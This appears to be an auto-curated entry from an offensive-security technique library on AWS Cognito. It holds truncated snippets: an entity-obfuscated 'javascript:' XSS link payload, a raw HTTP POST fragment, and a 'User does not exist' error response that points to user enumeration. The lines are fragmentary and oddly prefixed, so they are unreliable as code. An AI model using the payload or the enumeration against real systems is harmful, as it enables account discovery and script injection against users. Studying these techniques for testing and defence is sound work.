---
technique: "AWS Cognito"
family: "auth-session"
severity_hint: "medium"
tags: []
source: "_raw/Cloud/AWS Cognito.md"
source_sha256: "746d15ee8b4b655ed04a9a8c7fae25f6b7c02ec854481f7cbb5245cdacdfd6d6"
curator_version: 2
...
- `elixir: <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;(function(){var data='';for(var i=0`
- `elixir: POST / HTTP/2`
- `elixir: {`
- `elixir: {`
- `elixir: {"__type":"UserNotFoundException","message":"User does not exist."} # Returns an error`
...
## Source
Original note: `_raw/Cloud/AWS Cognito.md`
